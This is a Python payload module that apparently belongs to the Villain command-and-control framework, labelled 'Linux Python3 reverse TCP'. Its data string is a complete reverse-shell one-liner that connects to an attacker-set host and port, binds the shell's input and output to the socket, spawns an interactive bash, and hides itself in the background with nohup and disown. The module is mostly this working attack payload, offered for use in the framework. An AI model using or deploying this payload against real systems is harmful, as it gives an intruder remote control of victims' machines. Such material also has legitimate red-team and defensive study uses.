# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Linux Python3 reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Classic Python3 reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'python3-reverse-tcp',
        'os' : 'linux'  
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"*LHOST*\",*LPORT*));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")' > /dev/null 2>&1 & disown"
